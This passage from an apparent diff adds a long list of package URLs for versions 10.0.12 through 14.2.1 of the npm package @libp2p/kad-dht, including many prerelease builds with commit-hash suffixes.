+      - pkg:npm/%40libp2p/kad-dht@10.0.12-dfbe0cc0
+      - pkg:npm/%40libp2p/kad-dht@10.0.12-f4fac961
+      - pkg:npm/%40libp2p/kad-dht@10.0.12-fdcb801e
+      - pkg:npm/%40libp2p/kad-dht@10.0.12
+      - pkg:npm/%40libp2p/kad-dht@10.0.13-70d5efc2e
+      - pkg:npm/%40libp2p/kad-dht@10.0.13-fb8a6f188
+      - pkg:npm/%40libp2p/kad-dht@10.0.13
+      - pkg:npm/%40libp2p/kad-dht@10.0.14-c960eb659
+      - pkg:npm/%40libp2p/kad-dht@10.0.14-effcfaa8e
+      - pkg:npm/%40libp2p/kad-dht@10.0.14
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-05b52d69c
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-0b4a2ee79
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-0f5c305af
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-13a870cbe
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-3dee5df4d
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-4a474d54d
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-6625a27fc
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-68db79f6b
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-6b6ba9ab7
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-74e84bc29
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-7877a50e0
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-8bb6d5333
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-8f921ee97
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-97ab31c0c
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-9c67c5b3d
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-adea7bbbf
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-bb6ceb192
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-d729d66a5
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-d8f5bc211
+      - pkg:npm/%40libp2p/kad-dht@10.0.15-e2267d437
+      - pkg:npm/%40libp2p/kad-dht@10.0.15
+      - pkg:npm/%40libp2p/kad-dht@11.0.0-06e6d235f
+      - pkg:npm/%40libp2p/kad-dht@11.0.0-273d8177c
+      - pkg:npm/%40libp2p/kad-dht@11.0.0-551622a96
+      - pkg:npm/%40libp2p/kad-dht@11.0.0-7682861f9
+      - pkg:npm/%40libp2p/kad-dht@11.0.0-8e4fbe13a
+      - pkg:npm/%40libp2p/kad-dht@11.0.0-a32e70bac
+      - pkg:npm/%40libp2p/kad-dht@11.0.0-bcf18265e
+      - pkg:npm/%40libp2p/kad-dht@11.0.0
+      - pkg:npm/%40libp2p/kad-dht@11.0.1-53224004f
+      - pkg:npm/%40libp2p/kad-dht@11.0.1-561797a89
+      - pkg:npm/%40libp2p/kad-dht@11.0.1-6c1f0ee81
+      - pkg:npm/%40libp2p/kad-dht@11.0.1-bca8d6e68
+      - pkg:npm/%40libp2p/kad-dht@11.0.1-cf963694f
+      - pkg:npm/%40libp2p/kad-dht@11.0.1
+      - pkg:npm/%40libp2p/kad-dht@11.0.2-7861ed882
+      - pkg:npm/%40libp2p/kad-dht@11.0.2-8c169db1b
+      - pkg:npm/%40libp2p/kad-dht@11.0.2-9197f10ba
+      - pkg:npm/%40libp2p/kad-dht@11.0.2-e7167fe52
+      - pkg:npm/%40libp2p/kad-dht@11.0.2-f537b3731
+      - pkg:npm/%40libp2p/kad-dht@11.0.2
+      - pkg:npm/%40libp2p/kad-dht@11.0.3-738dd40f1
+      - pkg:npm/%40libp2p/kad-dht@11.0.3
+      - pkg:npm/%40libp2p/kad-dht@11.0.4-09dd02987
+      - pkg:npm/%40libp2p/kad-dht@11.0.4-10ea19700
+      - pkg:npm/%40libp2p/kad-dht@11.0.4-5a9362e21
+      - pkg:npm/%40libp2p/kad-dht@11.0.4-bcfa15993
+      - pkg:npm/%40libp2p/kad-dht@11.0.4
+      - pkg:npm/%40libp2p/kad-dht@11.0.5-16588d27c
+      - pkg:npm/%40libp2p/kad-dht@11.0.5-3bf6387ff
+      - pkg:npm/%40libp2p/kad-dht@11.0.5-64a915ae9
+      - pkg:npm/%40libp2p/kad-dht@11.0.5-887c6ffe1
+      - pkg:npm/%40libp2p/kad-dht@11.0.5-93890c8f9
+      - pkg:npm/%40libp2p/kad-dht@11.0.5-d10506189
+      - pkg:npm/%40libp2p/kad-dht@11.0.5
+      - pkg:npm/%40libp2p/kad-dht@11.0.6-341581166
+      - pkg:npm/%40libp2p/kad-dht@11.0.6-6d11e8268
+      - pkg:npm/%40libp2p/kad-dht@11.0.6
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-742915567
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-01e9a5fe4
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-07f3afe2d
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-230afea4b
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-984f13e42
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-9eff7eff0
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-a7c6a93c6
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-ad6f70bf3
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-f71f2e14e
+      - pkg:npm/%40libp2p/kad-dht@11.0.7-f81be145a
+      - pkg:npm/%40libp2p/kad-dht@11.0.7
+      - pkg:npm/%40libp2p/kad-dht@11.0.8-178fe2671
+      - pkg:npm/%40libp2p/kad-dht@11.0.8-83dfc7dc8
+      - pkg:npm/%40libp2p/kad-dht@11.0.8-c00378909
+      - pkg:npm/%40libp2p/kad-dht@11.0.8
+      - pkg:npm/%40libp2p/kad-dht@12.0.0-28587d24f
+      - pkg:npm/%40libp2p/kad-dht@12.0.0-4e0135c7d
+      - pkg:npm/%40libp2p/kad-dht@12.0.0-5d1f68e92
+      - pkg:npm/%40libp2p/kad-dht@12.0.0-6fd681d09
+      - pkg:npm/%40libp2p/kad-dht@12.0.0-cd8cafcd5
+      - pkg:npm/%40libp2p/kad-dht@12.0.0
+      - pkg:npm/%40libp2p/kad-dht@12.0.1-388d02b33
+      - pkg:npm/%40libp2p/kad-dht@12.0.1-444d83751
+      - pkg:npm/%40libp2p/kad-dht@12.0.1-528d73781
+      - pkg:npm/%40libp2p/kad-dht@12.0.1-581574d6d
+      - pkg:npm/%40libp2p/kad-dht@12.0.1-ba7089984
+      - pkg:npm/%40libp2p/kad-dht@12.0.1-d011f6130
+      - pkg:npm/%40libp2p/kad-dht@12.0.1
+      - pkg:npm/%40libp2p/kad-dht@12.0.2-900236724
+      - pkg:npm/%40libp2p/kad-dht@12.0.2-4691f4173
+      - pkg:npm/%40libp2p/kad-dht@12.0.2-821a38e24
+      - pkg:npm/%40libp2p/kad-dht@12.0.2-856ccd708
+      - pkg:npm/%40libp2p/kad-dht@12.0.2-ddaa59a60
+      - pkg:npm/%40libp2p/kad-dht@12.0.2-ee7ffe9b9
+      - pkg:npm/%40libp2p/kad-dht@12.0.2
+      - pkg:npm/%40libp2p/kad-dht@12.0.3-092861e23
+      - pkg:npm/%40libp2p/kad-dht@12.0.3-8bbd43628
+      - pkg:npm/%40libp2p/kad-dht@12.0.3
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-08f6f607d
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-2e464c099
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-3e47d88fd
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-72f0e09f7
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-74477f6ea
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-74fb5671d
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-8c6654c3a
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-9376e61a1
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-dbc92ab74
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-f27138ca1
+      - pkg:npm/%40libp2p/kad-dht@12.0.4-f4dda4a3c
+      - pkg:npm/%40libp2p/kad-dht@12.0.4
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-0321812e7
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-03ff9fd82
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-1cb2408ac
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-2370d1c39
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-6f323de7d
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-9891ecd73
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-c9ed1c7d6
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-dab5cf724
+      - pkg:npm/%40libp2p/kad-dht@12.0.5-e1db332a4
+      - pkg:npm/%40libp2p/kad-dht@12.0.5
+      - pkg:npm/%40libp2p/kad-dht@12.0.6-0c7bbbb07
+      - pkg:npm/%40libp2p/kad-dht@12.0.6
+      - pkg:npm/%40libp2p/kad-dht@12.0.7-8072a2e59
+      - pkg:npm/%40libp2p/kad-dht@12.0.7-b1b77adb4
+      - pkg:npm/%40libp2p/kad-dht@12.0.7-bedfd0aa2
+      - pkg:npm/%40libp2p/kad-dht@12.0.7-e1c01370b
+      - pkg:npm/%40libp2p/kad-dht@12.0.7-f0d2b52d0
+      - pkg:npm/%40libp2p/kad-dht@12.0.7-fb7c51c3c
+      - pkg:npm/%40libp2p/kad-dht@12.0.7
+      - pkg:npm/%40libp2p/kad-dht@12.0.8-2122a713d
+      - pkg:npm/%40libp2p/kad-dht@12.0.8-28e51652a
+      - pkg:npm/%40libp2p/kad-dht@12.0.8-83ef3717e
+      - pkg:npm/%40libp2p/kad-dht@12.0.8-a9cc0ee49
+      - pkg:npm/%40libp2p/kad-dht@12.0.8-ab466004b
+      - pkg:npm/%40libp2p/kad-dht@12.0.8-f71bc49bd
+      - pkg:npm/%40libp2p/kad-dht@12.0.8
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-1fc929c1c
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-330a5ed72
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-59a97b61b
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-82901e785
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-bf720c045
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-cad9cf007
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-e1798aa26
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-f39ce5f13
+      - pkg:npm/%40libp2p/kad-dht@12.0.9-fad3074b8
+      - pkg:npm/%40libp2p/kad-dht@12.0.9
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-1f589c822
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-3e515f007
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-3ffecc5bf
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-4fc0a7d30
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-80278b36b
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-a2b41f793
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-ab5f05763
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-afe15f669
+      - pkg:npm/%40libp2p/kad-dht@12.0.10-d446c6c31
+      - pkg:npm/%40libp2p/kad-dht@12.0.10
+      - pkg:npm/%40libp2p/kad-dht@12.0.11-2b2958fe6
+      - pkg:npm/%40libp2p/kad-dht@12.0.11-2c56203f9
+      - pkg:npm/%40libp2p/kad-dht@12.0.11-732c436d4
+      - pkg:npm/%40libp2p/kad-dht@12.0.11-936dbba10
+      - pkg:npm/%40libp2p/kad-dht@12.0.11-b17824a1d
+      - pkg:npm/%40libp2p/kad-dht@12.0.11
+      - pkg:npm/%40libp2p/kad-dht@12.0.12-08dabd390
+      - pkg:npm/%40libp2p/kad-dht@12.0.12-31c78f4ed
+      - pkg:npm/%40libp2p/kad-dht@12.0.12
+      - pkg:npm/%40libp2p/kad-dht@12.0.13-2281f802b
+      - pkg:npm/%40libp2p/kad-dht@12.0.13-acef72613
+      - pkg:npm/%40libp2p/kad-dht@12.0.13-c2181f0cf
+      - pkg:npm/%40libp2p/kad-dht@12.0.13-ea4f26285
+      - pkg:npm/%40libp2p/kad-dht@12.0.13-eaf8ac7cf
+      - pkg:npm/%40libp2p/kad-dht@12.0.13-fd1f8343d
+      - pkg:npm/%40libp2p/kad-dht@12.0.13
+      - pkg:npm/%40libp2p/kad-dht@12.0.14-3bc94b403
+      - pkg:npm/%40libp2p/kad-dht@12.0.14-3d7a9da17
+      - pkg:npm/%40libp2p/kad-dht@12.0.14-90cfd25e2
+      - pkg:npm/%40libp2p/kad-dht@12.0.14-998fcaf94
+      - pkg:npm/%40libp2p/kad-dht@12.0.14-c82432312
+      - pkg:npm/%40libp2p/kad-dht@12.0.14-de3f7aeaf
+      - pkg:npm/%40libp2p/kad-dht@12.0.14-e1923b0a7
+      - pkg:npm/%40libp2p/kad-dht@12.0.14
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-1488a7371
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-43046b9ae
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-4ad63bb79
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-510d9ce65
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-767b23e71
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-7ae6063df
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-83c14d08f
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-9d13a2f6a
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-9d4b0596f
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-a11e135c2
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-bfa7660d5
+      - pkg:npm/%40libp2p/kad-dht@12.0.15-d9366f9aa
+      - pkg:npm/%40libp2p/kad-dht@12.0.15
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-1a41c28bb
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-1cc6a9405
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-1cd5aae11
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-1eb5b2713
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-3c73707ff
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-48444f750
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-5b7380259
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-7de56f244
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-8214dcfb0
+      - pkg:npm/%40libp2p/kad-dht@12.0.16-a3e8beabd
+      - pkg:npm/%40libp2p/kad-dht@12.0.16
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-12106b5b0
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-167bf2b3c
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-169c9d85e
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-352699ab5
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-440c9b360
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-4bd8e4f79
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-6011d3697
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-62e32252a
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-7464dc00c
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-757fb2674
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-769461d3b
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-7aec7bd45
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-90d10b565
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-bc6556f96
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-e69a2f1b6
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-f4e572cd6
+      - pkg:npm/%40libp2p/kad-dht@12.0.17-f6fe2cc3c
+      - pkg:npm/%40libp2p/kad-dht@12.0.17
+      - pkg:npm/%40libp2p/kad-dht@12.0.18-44791342
+      - pkg:npm/%40libp2p/kad-dht@12.0.18-863b3de03
+      - pkg:npm/%40libp2p/kad-dht@12.0.18-8e4fdcde9
+      - pkg:npm/%40libp2p/kad-dht@12.0.18-94cac115a
+      - pkg:npm/%40libp2p/kad-dht@12.0.18-9e0236627
+      - pkg:npm/%40libp2p/kad-dht@12.0.18-d1f1c2be7
+      - pkg:npm/%40libp2p/kad-dht@12.0.18
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-0b55625d1
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-15eb66428
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-21cf7bc56
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-3b9cbf7d8
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-6573cb8b0
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-abb9f90c7
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-af85a7cad
+      - pkg:npm/%40libp2p/kad-dht@12.1.0-b0b6cae12
+      - pkg:npm/%40libp2p/kad-dht@12.1.0
+      - pkg:npm/%40libp2p/kad-dht@12.1.1-151bc46fb
+      - pkg:npm/%40libp2p/kad-dht@12.1.1-3319ff41e
+      - pkg:npm/%40libp2p/kad-dht@12.1.1-ce6da9896
+      - pkg:npm/%40libp2p/kad-dht@12.1.1-d1aec4d9f
+      - pkg:npm/%40libp2p/kad-dht@12.1.1-e1f0b307c
+      - pkg:npm/%40libp2p/kad-dht@12.1.1-e9b6a242a
+      - pkg:npm/%40libp2p/kad-dht@12.1.1
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-34cf1f7cd
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-40902d99b
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-4a994c5ef
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-73f2b6b6d
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-8b3114292
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-928801a80
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-a130993ed
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-a82ff8221
+      - pkg:npm/%40libp2p/kad-dht@12.1.2-a8ec2bcb7
+      - pkg:npm/%40libp2p/kad-dht@12.1.2
+      - pkg:npm/%40libp2p/kad-dht@12.1.3-944935f8d
+      - pkg:npm/%40libp2p/kad-dht@12.1.3-f30e2ee8d
+      - pkg:npm/%40libp2p/kad-dht@12.1.3
+      - pkg:npm/%40libp2p/kad-dht@12.1.4-0edbfe7af
+      - pkg:npm/%40libp2p/kad-dht@12.1.4-1dfb74e79
+      - pkg:npm/%40libp2p/kad-dht@12.1.4-7939dbd5c
+      - pkg:npm/%40libp2p/kad-dht@12.1.4-c5dba70a9
+      - pkg:npm/%40libp2p/kad-dht@12.1.4
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-1675adee2
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-2265e59ba
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-2bbaf4361
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-359265a3a
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-3c8dd5bbf
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-50b897139
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-5214dec4a
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-71e5f7a5b
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-737b3ea5b
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-7655e5200
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-81ebe4e47
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-a142bb642
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-b6681bd25
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-c010d575c
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-dd7b329c4
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-df330695a
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-e1ca9cced
+      - pkg:npm/%40libp2p/kad-dht@12.1.5-e211b46cc
+      - pkg:npm/%40libp2p/kad-dht@12.1.5
+      - pkg:npm/%40libp2p/kad-dht@13.0.0-1210884ed
+      - pkg:npm/%40libp2p/kad-dht@13.0.0-18dd3cb26
+      - pkg:npm/%40libp2p/kad-dht@13.0.0-7cd984569
+      - pkg:npm/%40libp2p/kad-dht@13.0.0-d101aac4b
+      - pkg:npm/%40libp2p/kad-dht@13.0.0
+      - pkg:npm/%40libp2p/kad-dht@13.0.1-21fe841f2
+      - pkg:npm/%40libp2p/kad-dht@13.0.1-34455b5f2
+      - pkg:npm/%40libp2p/kad-dht@13.0.1-4fd7eb2e1
+      - pkg:npm/%40libp2p/kad-dht@13.0.1-6ccbb06f0
+      - pkg:npm/%40libp2p/kad-dht@13.0.1-c628c44c5
+      - pkg:npm/%40libp2p/kad-dht@13.0.1
+      - pkg:npm/%40libp2p/kad-dht@13.0.2-7f7ec82ae
+      - pkg:npm/%40libp2p/kad-dht@13.0.2-b3272cfce
+      - pkg:npm/%40libp2p/kad-dht@13.0.2
+      - pkg:npm/%40libp2p/kad-dht@13.0.3-c258b35af
+      - pkg:npm/%40libp2p/kad-dht@13.0.3
+      - pkg:npm/%40libp2p/kad-dht@13.0.4-980038477
+      - pkg:npm/%40libp2p/kad-dht@13.0.4-0c5957836
+      - pkg:npm/%40libp2p/kad-dht@13.0.4-c5988cce8
+      - pkg:npm/%40libp2p/kad-dht@13.0.4-fa83ee1c7
+      - pkg:npm/%40libp2p/kad-dht@13.0.4
+      - pkg:npm/%40libp2p/kad-dht@13.1.0-82bd42bcf
+      - pkg:npm/%40libp2p/kad-dht@13.1.0-a390db4a4
+      - pkg:npm/%40libp2p/kad-dht@13.1.0-dad979f9b
+      - pkg:npm/%40libp2p/kad-dht@13.1.0
+      - pkg:npm/%40libp2p/kad-dht@13.1.1-24fa1d5af
+      - pkg:npm/%40libp2p/kad-dht@13.1.1-58784abf7
+      - pkg:npm/%40libp2p/kad-dht@13.1.1-d9c7e0f7e
+      - pkg:npm/%40libp2p/kad-dht@13.1.1
+      - pkg:npm/%40libp2p/kad-dht@13.1.2-27b2fa6b6
+      - pkg:npm/%40libp2p/kad-dht@13.1.2-32c176fd5
+      - pkg:npm/%40libp2p/kad-dht@13.1.2-35b48025c
+      - pkg:npm/%40libp2p/kad-dht@13.1.2-661d6586a
+      - pkg:npm/%40libp2p/kad-dht@13.1.2-80e798cdc
+      - pkg:npm/%40libp2p/kad-dht@13.1.2-b4f02a637
+      - pkg:npm/%40libp2p/kad-dht@13.1.2
+      - pkg:npm/%40libp2p/kad-dht@14.0.0-0d326d102
+      - pkg:npm/%40libp2p/kad-dht@14.0.0-934a891f9
+      - pkg:npm/%40libp2p/kad-dht@14.0.0-d4da56961
+      - pkg:npm/%40libp2p/kad-dht@14.0.0-d7a818e8e
+      - pkg:npm/%40libp2p/kad-dht@14.0.0-e99e8f448
+      - pkg:npm/%40libp2p/kad-dht@14.0.0
+      - pkg:npm/%40libp2p/kad-dht@14.0.1-3244ed086
+      - pkg:npm/%40libp2p/kad-dht@14.0.1-3bc9769b8
+      - pkg:npm/%40libp2p/kad-dht@14.0.1-4521cf1f7
+      - pkg:npm/%40libp2p/kad-dht@14.0.1-5d199f9b6
+      - pkg:npm/%40libp2p/kad-dht@14.0.1-75301ac7d
+      - pkg:npm/%40libp2p/kad-dht@14.0.1-aa8de9fd3
+      - pkg:npm/%40libp2p/kad-dht@14.0.1-e6b4158c6
+      - pkg:npm/%40libp2p/kad-dht@14.0.1
+      - pkg:npm/%40libp2p/kad-dht@14.0.2-717731e49
+      - pkg:npm/%40libp2p/kad-dht@14.0.2-7383821e1
+      - pkg:npm/%40libp2p/kad-dht@14.0.2-a657bbd2e
+      - pkg:npm/%40libp2p/kad-dht@14.0.2-d34642db1
+      - pkg:npm/%40libp2p/kad-dht@14.0.2
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-432955390
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-665769021
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-02f285fc8
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-0a3406a05
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-2feaeddb4
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-32ca76fcb
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-6bd7f9169
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-7626b224d
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-7c085d10c
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-7dcabb884
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-7dead6d35
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-844a8d2d1
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-91687998d
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-a5cd8cfbe
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-ad5cfd66a
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-adc767899
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-c2ff2e454
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-c917314f3
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-d30d07e6f
+      - pkg:npm/%40libp2p/kad-dht@14.1.0-eee97c7d4
+      - pkg:npm/%40libp2p/kad-dht@14.1.0
+      - pkg:npm/%40libp2p/kad-dht@14.1.1-05d559f54
+      - pkg:npm/%40libp2p/kad-dht@14.1.1-656db81cf
+      - pkg:npm/%40libp2p/kad-dht@14.1.1
+      - pkg:npm/%40libp2p/kad-dht@14.1.2-f53f65d18
+      - pkg:npm/%40libp2p/kad-dht@14.1.2
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-06f79b646
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-0862522fe
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-2625cc323
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-2c182d2e2
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-339b7df88
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-3650283f7
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-406b3916c
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-4761dd701
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-48e9cfa56
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-4a85eb033
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-6ab85ea68
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-6ddc1b80e
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-8a9258a24
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-92cc74082
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-9614de7c6
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-96654117c
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-98b43045c
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-99f5f270b
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-a0c8ceb99
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-a82b07d8c
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-b02ea9b6e
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-b248eefc0
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-bc90b4fd5
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-d19974d93
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-d6cd25d0d
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-d866eb5bb
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-f2f9008b8
+      - pkg:npm/%40libp2p/kad-dht@14.1.3-f8da60e73
+      - pkg:npm/%40libp2p/kad-dht@14.1.3
+      - pkg:npm/%40libp2p/kad-dht@14.1.4-127abe24b
+      - pkg:npm/%40libp2p/kad-dht@14.1.4-5c4a79e5a
+      - pkg:npm/%40libp2p/kad-dht@14.1.4
+      - pkg:npm/%40libp2p/kad-dht@14.1.5-023ea575c
+      - pkg:npm/%40libp2p/kad-dht@14.1.5-3c63482e5
+      - pkg:npm/%40libp2p/kad-dht@14.1.5-d3e5a3382
+      - pkg:npm/%40libp2p/kad-dht@14.1.5
+      - pkg:npm/%40libp2p/kad-dht@14.1.6-20d9ba73e
+      - pkg:npm/%40libp2p/kad-dht@14.1.6-285dab7d7
+      - pkg:npm/%40libp2p/kad-dht@14.1.6-52f0f2f13
+      - pkg:npm/%40libp2p/kad-dht@14.1.6-5acfae333
+      - pkg:npm/%40libp2p/kad-dht@14.1.6-abe9bd154
+      - pkg:npm/%40libp2p/kad-dht@14.1.6-ae75570c8
+      - pkg:npm/%40libp2p/kad-dht@14.1.6-f4747450f
+      - pkg:npm/%40libp2p/kad-dht@14.1.6
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-06fc82da8
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-15a70af5f
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-4bbcfa707
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-723bde6ce
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-b56d91884
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-c90984ec7
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-e2ec7bdaa
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-f767126e1
+      - pkg:npm/%40libp2p/kad-dht@14.2.0-fe8af37a1
+      - pkg:npm/%40libp2p/kad-dht@14.2.0
+      - pkg:npm/%40libp2p/kad-dht@14.2.1-26313e695
